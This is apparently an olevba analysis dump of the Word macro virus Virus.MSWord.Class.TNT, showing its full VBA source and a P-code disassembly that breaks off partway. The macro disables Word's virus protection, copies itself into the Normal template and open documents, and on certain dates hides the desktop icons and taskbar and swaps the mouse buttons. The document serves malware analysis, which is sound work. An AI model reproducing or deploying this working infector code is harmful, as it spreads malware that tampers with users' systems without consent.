olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.TNT
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.TNT - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const SW_HIDE = 0
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetDesktopWindow Lib "User32.dll" () As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function ShowWindow Lib "User32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
Private Sub Document_Close()
    Dim stato As Boolean
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim stress As String
    Dim bry As Variant
    Dim hWnd_DesktopIcons As Long
    Dim hWnd_StartBar As Long
    Dim X As Long
    
    On Error Resume Next
    stato = ActiveDocument.Saved

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With
        SetAttr "c:\cont.dbl", vbNormal: Kill "c:\cont.dbl": Open "c:\cont.dbl" For Output As #1
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    Close #1
        
    SetAttr "c:\cont.dbl", vbNormal

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    If Minute(Time) = 30 Or Day(Date) = 25 Then
    X = SystemParametersInfo(97, True, CStr(1), 0)
    hWnd_DesktopIcons = GetWindow(FindWindow("Progman", "Program Manager"), 5)
    ShowWindow hWnd_DesktopIcons, SW_HIDE
    hWnd_StartBar = FindWindow("Shell_TrayWnd", "")
    ShowWindow hWnd_StartBar, SW_HIDE
    SwapMouseButton& True
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim bry As Variant
    
    On Error Resume Next

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.TNT
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12086 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn SW_HIDE
' Line #2:
' 	FuncDefn (Private Declare Function FindWindow Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function GetDesktopWindow Lib "User32.dll" () As Long)
' Line #4:
' 	FuncDefn (Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #5:
' 	FuncDefn (Private Declare Function ShowWindow Lib "User32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long)
' Line #6:
' 	FuncDefn (Private Declare Function SystemParametersInfo Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As , ByVal fuWinIni As Long) As Long)
' Line #7:
' 	FuncDefn (Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long))
' Line #8:
' 	FuncDefn (Private Sub Document_Close())
' Line #9:
' 	Dim 
' 	VarDefn stato (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #12:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #13:
' 	Dim 
' 	VarDefn stress (As String)
' Line #14:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #15:
' 	Dim 
' 	VarDefn hWnd_DesktopIcons (As Long)
' Line #16:
' 	Dim 
' 	VarDefn hWnd_StartBar (As Long)
' Line #17:
' 	Dim 
' 	VarDefn X (As Long)
' Line #18:
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #21:
' Line #22:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #24:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #25:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #26:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #27:
' 	EndWith 
' Line #28:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #29:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #30:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' Line #33:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #35:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #36:
' 	Loop 
' Line #37:
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #41:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' Line #44:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #46:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #47:
' 	Loop 
' Line #48:
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #53:
' Line #54:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #55:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #56:
' Line #57:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #58:
' Line #59:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #60:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #62:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #63:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #64:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #65:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #66:
' 	ExitFor 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' Line #71:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #73:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #74:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' Line #76:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #77:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #78:
' 	Loop 
' Line #79:
' Line #80:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #81:
' Line #82:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #83:
' 	EndIfBlock 
' Line #84:
' Line #85:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #86:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #87:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpynorm 
' 	EndIf 
' Line #88:
' 	LitDI2 0x0001 
' 	St count 
' Line #89:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #90:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #91:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #92:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #93:
' 	Loop 
' Line #94:
' 	Label cpynorm 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #96:
' 	EndIfBlock 
' Line #97:
' Line #98:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #99:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #100:
' Line #101:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #102:
' Line #103:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #104:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #105:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #106:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #107:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #109:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #110:
' 	ExitFor 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' Line #115:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #117:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #118:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' Line #120:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #121:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #122:
' 	Loop 
' Line #123:
' Line #124:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #125:
' Line #126:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #127:
' 	EndIfBlock 
' Line #128:
' Line #129:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #130:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #131:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyacti 
' 	EndIf 
' Line #132:
' 	LitDI2 0x0001 
' 	St count 
' Line #133:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #134:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #135:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #136:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #137:
' 	Loop 
' Line #138:
' 	Label cpyacti 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #140:
' 	EndIfBlock 
' Line #141:
' Line #142:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #143:
' Line #144:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #145:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #146:
' 	EndIfBlock 
' Line #147:
' Line #148:
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #149:
' 	LitDI2 0x0061 
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Coerce (Str) 
' 	LitDI2 0x0000 
' 	ArgsLd SystemParametersInfo 0x0004 
' 	St X 
' Line #150:
' 	LitStr 0x0007 "Progman"
' 	LitStr 0x000F "Program Manager"
' 	ArgsLd FindWindow 0x0002 
' 	LitDI2 0x0005 
' 	ArgsLd GetWindow 0x0002 
' 	St hWnd_DesktopIcons 
' Line #151:
' 	Ld hWnd_DesktopIcons 
' 	Ld SW_HIDE 
' 	ArgsCall ShowWindow 0x0002 
' Line #152:
' 	LitStr 0x000D "Shell_TrayWnd"
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd_StartBar 
' Line #153:
' 	Ld hWnd_StartBar 
' 	Ld SW_HIDE 
' 	ArgsCall ShowWindow 0x0002 
' Line #154:
' 	LitVarSpecial (True)
' 	ArgsCall SwapMouseButton& 0x0001 
' Line #155:
' 	EndIfBlock 
' Line #156:
' Line #157:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #158:
' Line #159:
' 	OnError (GoTo 0) 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Private Sub Document_Open())
' Line #162:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #163:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #164:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #165:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #166:
' Line #167:
' 	OnError (Resume Next) 
' Line #168:
' Line #169:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #170:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #171:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #172:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #173:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #174:
' 	EndWith 
' Line #175:
' Line #176:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #177:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #178:
' Line #179:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #180:
' Line #181:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #182:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #183:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #184:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #185:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #186:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #187:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #188:
' 	ExitFor 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' Line #193:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #194:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #195:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #196:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' Line #198:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #199:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #200:
' 	Loop 
' Line #201:
' Line #202:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #203:
' Line #204:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #205:
' 	EndIfBlock 
' Line #206:
' Line #207:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #208:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #209:
' Line #210:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #211:
' Line #212:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #213:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	IfBlock 
' Line #214:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #215:
